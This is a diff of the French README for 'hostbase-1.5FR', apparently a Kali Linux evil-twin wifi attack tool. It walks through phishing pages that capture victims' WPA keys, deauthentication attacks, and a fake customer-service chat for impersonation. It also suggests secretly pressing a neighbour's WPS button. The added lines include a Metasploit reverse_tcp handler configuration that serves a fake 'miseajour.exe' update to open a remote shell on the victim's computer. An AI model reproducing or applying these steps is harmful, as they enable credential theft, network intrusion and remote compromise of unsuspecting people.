@@ -5,131 +5,25 @@ Bienvenue dans le projet hostabse.
 
 Fichier ALIREIMPORTANT fait pour les utilisateurs de kali-linux, le script fonctionne bien avec kali-linux xfce 2022.2 précisément.
 
-CHANGELOG de cette nouvelle version de hostbase-1.5FR(juillet 2022):
+CHANGELOG de cette mise a jour de la version hostbase-1.5FR(aout 2022):
 
-- Correction des fonctions berate_ap qui permet de rentrer le nom (SSID) exact du réseau.
-- Actualisation des pages de phishing qui n'étaient pas actualisées depuis 4 ans.Ajout de nouvelles pages de phishing "wpa3" pour les réseaux en wpa3 (ces pages seront ammenées a etre modifier dans le futur en fonction des boxs que proposeront les opérateurs.
-- Actualisation du tchat qui permet de se faire passer pour le service client.
-- Ajout de "colorize" qui permettra de voir apparaitre la clé wifi WPA en rouge dans la console de hostbase (pour les pages wpa3 uniquement car l'option n'est pas compatible avec les pages WPS).Bien évidemment si la victime ne rentre pas sa clé WPA dans la page de phshing il n'y aura rien qui s'affichera.
-- Modifications des pages 404 et microsoft pour détecter si le navigateur est chrome ou mozilla et ainsi proposer une page de phishing adaptée.La page microsoft fonctionne avec metasploit a lancer dans une autre console en faisant télécharger une fausse mise a jour (payload) a la victime pour récupérér la clé sur l"ordinateur de la victime, ne l'utilisez pas si vous ne savez pas vous servir de metasploit.
-- Correction d'un oubli de ma part dans l'option WPS PBC loop qui empéchait la capture de la clé wifi (ATTENTION: cette option doit etre utiliser indépendament des autres options et avec network-manager d'éteinds.Si vous voulez faire du social engineering en allant chez votre voisin prétextant quelque chose et que vous appuyez discrètement sur son bouton WPS, la clé s'affichera dans la console de hostbase, regardez bien l'historique de la console vers le haut car ça défile vite mais la clé WPA s'affichera en vert.
-- Ajout de mon adresse mail en bas de cette page pour avoir un support personnalisé et utiliser hostbase correctement.Je suis également ouvert a toute nouvelle collaboration :)
-
---------------------------------------------
-0- Installation si vous avez déja une version ancienne de hostbase: pour ceux qui ont déja eu hostbase, vous devez installer "colorize" en tapant ceci dans votre console: gem install colorize
-ATTENTTION: en faisant une mise a jour vers kali 2022.2, pour une raison que j'ignore, j'ai tout les ruby gem qui ont sautés (les "gem" sont des modules servant a interpréter du code en ruby avec certaines fonctionnalitées bien spécifiques).Donc si vous aussi avez des erreurs au moment de lancer: ruby hostbase.rb  vous devrez RÉEINSTALLER les gems de ruby correspondants.VOIR ÉTAPE 4 directement.
-
-Installation classique si vous n'avez pas de version ancienne de hostbase ou que vous venez d'installer kali-linux.
-
-1- Ouvrez une console pour installer les dépendances du script:
-
-apt-get install -y build-essential upgrade-system subversion wget g++ iptables pavucontrol ffmpeg sqlite3 libsqlite3-dev libssl-dev libnl-3-dev libnl-genl-3-dev dsniff hostapd isc-dhcp-server pkg-config xterm freeradius apache2 php libapache2-mod-php php-cli tcpdump python3-scapy vokoscreen wireshark bridge-utils devscripts gengetopt autoconf libtool make
-
-____________________________________________
-
-2- hostapd, savoir si ma carte est compatible avec hostapd (hostapd est je le rappel, un créateur de point d'accès):
-
-iw list | grep "Supported interface modes" -A 8
-
-le retour de commande devrait vous donner ceci si la carte wifi est comaptible avec hostapd:
-
-Supported interface modes:
-		 * IBSS
-		 * managed
-		 * AP
-		 * AP/VLAN
-		 * WDS
-		 * monitor
-		 * mesh point
-
-(Si votre carte wifi n'est pas compatible vous ne pourrez pas utiliser hostbase mais la plupart des cartes sont compatibles).
+-Ajout du script ainstaller.sh qui permet d'automatiser entièrement l'installation des dépendances du script et des gems de ruby.
 
 
-Si vous avez déja une version de hostapd supprimez la:
-apt-get remove hostapd
-
-
-Hostapd est maintenant en version 2_10, ici on utilise la version 2_9 je n'ai pas testé la 2_10 mais je pense que ça doit marcher aussi.
-
-Installation et compilation:
-wget https://w1.fi/cgit/hostap/snapshot/hostap_2_9.tar.gz
-tar -zxf hostap_2_9.tar.gz
-cd /root/hostap_2_9/hostapd
-cp defconfig .config
-nano .config
-
-Pour bien faire la compilation, enlevez ce symbole # au début des options qui suivent:
-
-CONFIG_DRIVER_NL80211=y
-CONFIG_LIBNL32=y
-CONFIG_EAP_PWD=y
-CONFIG_WPS=y
-CONFIG_WPS_UPNP=y
-CONFIG_WPS_NFC=y
-CONFIG_RADIUS_SERVER=y
-CONFIG_IEEE80211N=y
-CONFIG_IEEE80211AC=y
-CONFIG_DEBUG_FILE=y
-CONFIG_FULL_DYNAMIC_VLAN=y
-CONFIG_TLSV11=y
-CONFIG_TAXONOMY=y
-
-
-Une fois le fichier de compilation enregistré, compilez le tout:
-
-sudo make
-sudo make install
-hostapd -v
-
-ATTENTION: si vous voulez vous amuser en créant un réseau en WPA3 il vous faudra rajouter a la fin du fichier de compilation (car il n'est pas présent par défaut): CONFIG_SAE=y
-Bien sur c'est facultatif et si vous ne le faites pas ça gènera pas le fonctionnement de hostbase.
-
-________________________________________________
-
-3- Apache le serveur web
-
-Copiez le fichier 000-default.conf fourni avec l'archive de hostbase dans /etc/apache2/site-available.
-Copiez le fichier apache2.conf fourni avec l'archive de hostbase dans /etc/apache2
-Entrez dans le dossier "PagesFR" fourni avec hostbase-1.5FR puis copiez l'intégralité des pages de phishing s'y trouvant dans /etc
-
-________________________________________________
-
-4- Ruby
-
-Hostbase est codé en ruby, pour utiliser l'interface graphique il faut installer les dépendances de ruby:
-
-
-apt-get install ruby
-apt-get install ruby-dev
-gem install highline
-gem install rake
-gem install bundler
-gem install colorize
-apt-get install libgtk2.0-dev
-apt install gobject-introspection
-apt install ruby-gtk2
 
 
 
 _________________________________________________
-mdk4
-apt-get install mdk4
 
--------------------------------------------------
-berate_ap
-apt install berate-ap
-
+INSTALLATION:
+0- rentrer dans le dossier hostbase-1.5FR et lancer le script ainstaller.sh tel que:
+bash ainstaller.sh
 _________________________________________________
 
-5- Début de l'attaque
+1- Début de l'attaque
 
-Le dossier hostbase-1.5FR doit etre copié dans /tmp pour commencer
-Passez en administrateur et copiez le dossier hostbase-1.5FR dans le répertoire /tmp
-
-Une fois le dossier copié, ouvrez une console et tapez ceci: 
-cd /tmp/hostbase-1.5FR
-
-Puis toujours dans la meme console, lancez hostbase comme ceci:
+--> Lors de la première utilisation après avoir lancer le script d'installation (bash ainstaller.sh), hostbase se lancera tout seul mais lors des utilisations suivantes suivre l'instrucion ci-dessous:
+rentrer dans le répertoire ou se situe hostbase-1.5FR et dans ce meme répertoire, lancez hostbase comme ceci:
 ruby hostbase.rb
 
 
@@ -144,7 +38,7 @@ Si vous rentrez autre chose que oui OU non en minuscule dans 5GHz vous aurez des
 
 ____________________________________________________
 
-6- Choisir son attaque, ici ça change un peu par rapport a la version de hostbase-1.4FR.
+2- Choisir son attaque, ici ça change un peu par rapport a la version de hostbase-1.4FR.
 
 Dans le champ page de phishing, vous devez entrer la page de phishing que vous souhaitez utiliser, cette nouvelle version de hostbase ne concernant que le WPS et le WPA3, vous rentrerez la page de phishing en minuscule comme ceci, chaque nom étant un choix différent:
 
@@ -178,7 +72,7 @@ cat /etc/wpa_supplicant.conf
 ____________________________________________________
 
 
-7- Un peu de social engineering
+3- Un peu de social engineering
 
 
 Hostbase dispose d'un tchat pour se faire passer pour le service client.Après avoir lancé l'attaque vous pouvez accéder a ce tchat en suivant ce lien dans votre navigateur internet:
@@ -196,7 +90,7 @@ Si l'utilisateur clique sur "aide en ligne" sur la page de phishing principale, 
 _____________________________________________________
 
 
-8- Ce qu'il faut savoir pour bien utiliser le tool.
+4- Ce qu'il faut savoir pour bien utiliser le tool.
 
 Ce tool utilise 2 cartes wifi pour etre plus puissant (une pour le fake AP et une pour la DoS en 2.4GHz) et 3 cartes wifi avec le mode 5GHz (une pour le fake AP, une pour la DoS en 2.4GHz et une pour la DoS en 5GHz).Ça demande d'avoir un matériel exigeant mais faut savoir ce que l'on veut aussi... car maintenant presque tout les réseaux émettent sur de fréquences 2.4GHz et 5GHz.
 
@@ -215,14 +109,27 @@ systemctl disable NetworkManager.service
 
 --> Si network-manager n'est pas eteinds vous aurez des erreurs par la suite.
 
---> Pour quitter le programme on sort toujours en appuyant sur CTRL+C (que vous ayez des erreurs ou pas).
+------> ATTENTTION: quelque soit l'option choisie, pour quitter le programme on sort toujours du programme en appuyant sur CTRL+C (que vous ayez des erreurs ou pas)
+
+------> ATTENTION: pour utiliser metasploit ou netcat en reverseshell votre payload doit pointer sur l'IP et le port de la machine attaquante (kali donc).Pour intégrer votre payload et que tout soit lancé automatiquement avec hostbase, modifiez le fichier metasploit.rc situé dans le meme dossier que hostbase-1.5FR.Par défaut le payload se trouve dans /root et s'appelle miseajour.exe voici le contenu du fichier metasploit.rc par défaut qui sera utiliser par metasploit et que vous devrez modifier avec vos paramètres AVANT de lancer hostbase.
+
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set EXE::Custom /root/miseajour.exe
+set LHOST 175.0.0.1
+set LPORT 4444
+exploit
+
+
 
 ____________________________________________________
 
 
-9- Je propose mon adresse mail pour ceux qui ont besoin d'aide pour utiliser hostbase ou tout simplement ceux qui auraient envi de collaborer de de me filer un coup de main dans le futur car je manque de temps pour entretenir le projet.Voici mon mail:
+5- Je propose mon adresse mail pour ceux qui ont besoin d'aide pour utiliser hostbase ou tout simplement ceux qui auraient envi de collaborer de de me filer un coup de main dans le futur car je manque de temps pour entretenir le projet.Voici mon mail:
 dubbleyou633@gmx.com
 
+Discord:
+Koala63#3474
 
 ATTENTION: si vous voulez de l'aide il me faut le copier/coller de l'historique de la console ou est lancé hostbase avec les erreurs ainsi que plusieurs captures d'écrans (screenshots) qui montreront les erreurs (notamment une capture d'écran de la console ou est lancé hostbase mais AUSSI les données que vous avez rentrer dans l'interface graphique de hostbase avant de lancer l'attaque.Il me faudra aussi les retours de:
 
